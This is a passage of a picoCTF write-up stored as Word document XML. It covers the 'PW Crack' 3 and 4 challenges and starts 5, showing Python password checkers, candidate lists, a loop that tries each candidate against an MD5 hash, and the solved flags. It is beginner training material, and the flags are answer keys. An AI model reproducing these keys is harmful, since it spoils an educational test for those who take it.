        <w:t xml:space="preserve">    m = hashlib.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>md5()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77D5BC68" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t xml:space="preserve">    m.update(pw_bytes)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DA9E1AF" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t xml:space="preserve">    return m.digest()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5943D2CF" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="19FB400B" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="56D4AE9A" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>def level_3_pw_check():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="383B2429" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t xml:space="preserve">    user_pw = input("Please enter correct password for flag: ")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FE7070B" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t xml:space="preserve">    </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>user_pw_hash = hash_pw(user_pw)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D061C24" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">    </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E72878B" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t xml:space="preserve">    </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>if( user_pw_hash == correct_pw_hash )</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2AC699B8" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t xml:space="preserve">        print("Welcome back... your flag, user:")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2003E07E" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t xml:space="preserve">        decryption = str_xor(flag_enc.decode(), user_pw)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FC80189" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t xml:space="preserve">        print(decryption)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46EFD4B6" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t xml:space="preserve">        return</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79C03230" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t xml:space="preserve">    print("That password is incorrect")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D52671A" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3D4A4077" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6497DDE9" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="312914D4" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>level_3_pw_check()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1010D30C" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="707D3884" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0EEE12E5" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t xml:space="preserve"># The strings below are 7 possibilities for the correct password. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E57A73E" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>#   (Only 1 is correct)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63B7DD5F" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>pos_pw_list = ["f09e", "4dcf", "87ab", "dba8", "752e", "3961", "f159"]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FB47C46" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6A105F72" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>md5 hash is caro@ubuntu:~/Downloads$ python3 level3.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="112A8656" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t xml:space="preserve">Please enter correct password for flag: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>dba8</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="277056A1" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>Welcome back... your flag, user:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BB8199C" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>picoCTF{m45h_fl1ng1ng_cd6ed2eb}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00BB3537" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="28F533A8" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>PW Crack 4</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61CB821B" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:spacing w:after="0"/>
      </w:pPr>
      <w:r>
        <w:t>| 100 points</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="574B357D" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>Tags: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B4FDF50" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>Author: LT 'syreal' Jones</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4236F746" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Description</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51B911F8" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Can you crack the password to get the flag? Download the password checker </w:t>
      </w:r>
      <w:hyperlink r:id="rId20" w:tgtFrame="_blank">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="InternetLink"/>
          </w:rPr>
          <w:t>here</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve"> and you'll need the encrypted </w:t>
      </w:r>
      <w:hyperlink r:id="rId21" w:tgtFrame="_blank">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="InternetLink"/>
          </w:rPr>
          <w:t>flag</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve"> and the </w:t>
      </w:r>
      <w:hyperlink r:id="rId22" w:tgtFrame="_blank">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="InternetLink"/>
          </w:rPr>
          <w:t>hash</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve"> in the same directory too. There are 100 potential passwords with only 1 being correct. You can find these by examining the password checker script.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43F33341" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="64022E7C" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>flag_enc = open('level4.flag.txt.enc', 'rb').read()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42BE3E23" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>correct_pw_hash = open('level4.hash.bin', 'rb').read()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17629E8F" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3D697F42" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1343E05E" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>def hash_pw(pw_str):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E034460" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">    pw_bytes = bytearray()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E62E2A0" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">    pw_bytes.extend(pw_str.encode())</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="429D0677" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">    m = hashlib.md5()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D0DE41D" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">    m.update(pw_bytes)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38F5010E" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">    return m.digest()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A364BBB" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="00041004" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="36E71D14" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>pos_pw_list = ["8c86", "7692", "a519", "3e61", "7dd6", "8919", "aaea", "f34b", "d9a2", "39f7", "626b", "dc78", "2a98", "7a85", "cd15", "80fa", "8571", "2f8a", "2ca6", "7e6b", "9c52", "7423", "a42c", "7da0", "95ab", "7de8", "6537", "ba1e", "4fd4", "20a0", "8a28", "2801", "2c9a", "4eb1", "22a5", "c07b", "1f39", "72bd", "97e9", "affc", "4e41", "d039", "5d30", "d13f", "c264", "c8be", "2221", "37ea", "ca5f", "fa6b", "5ada", "607a", "e469", "5681", "e0a4", "60aa", "d8f8", "8f35", "9474", "be73", "ef80", "ea43", "9f9e", "77d7", "d766", "55a0", "dc2d", "a970", "df5d", "e747", "dc69", "cc89", "e59a", "4f68", "14ff", "7928", "36b9", "eac6", "5c87", "da48", "5c1d", "9f63", "8b30", "5534", "2434", "4a82", "d72c", "9b6b", "73c5", "1bcf", "c739", "6c31", "e138", "9e77", "ace1", "2ede", "32e0", "3694", "fc92", "a7e2"]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B5367E0" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="29C4DB63" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="002124BC" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="128AE384" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="754700AA" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>def level_4_pw_check():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FF16D6E" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">    #user_pw = input("Please enter correct password for flag: ")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BFFE1C4" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">    </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t xml:space="preserve">for user_pw in pos_pw_list: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1284D6A6" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">        user_pw_hash = hash_pw(user_pw)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D2B6BDC" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t xml:space="preserve">        if( user_pw_hash == correct_pw_hash ):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55D58A52" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t xml:space="preserve">       </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:tab/>
        <w:t># print("Welcome back... your flag, user:")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C285CDA" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t xml:space="preserve">            print(user_pw)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="337F1B12" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">            decryption = str_xor(flag_enc.decode(), user_pw)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E3E4F64" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">            print(decryption)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27787E9B" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">            return</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="549DBA87" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">    </w:t>
      </w:r>
      <w:r>
        <w:tab/>
        <w:t>#print("That password is incorrect")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4209AC0D" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="081A54DB" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7535F8C6" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>level_4_pw_check()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3295AC02" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="32F487BE" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>caro@ubuntu:~/Downloads$ python3 level4.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A0854A5" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>607a</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CA428DD" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>picoCTF{fl45h_5pr1ng1ng_d770d48c}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20C087D8" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="15282FFB" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>PW Crack 5</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41C560BD" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:spacing w:after="0"/>
      </w:pPr>
      <w:r>
        <w:t>| 100 points</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C1D011C" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>Tags: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FC06FD5" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>Author: LT 'syreal' Jones</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="648EFDFE" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Description</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CB2DB47" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Can you crack the password to get the flag? Download the password checker </w:t>
      </w:r>
      <w:hyperlink r:id="rId23" w:tgtFrame="_blank">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="InternetLink"/>
          </w:rPr>
          <w:t>here</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve"> and you'll need the encrypted </w:t>
      </w:r>
      <w:hyperlink r:id="rId24" w:tgtFrame="_blank">
        <w:r>
          <w:rPr>
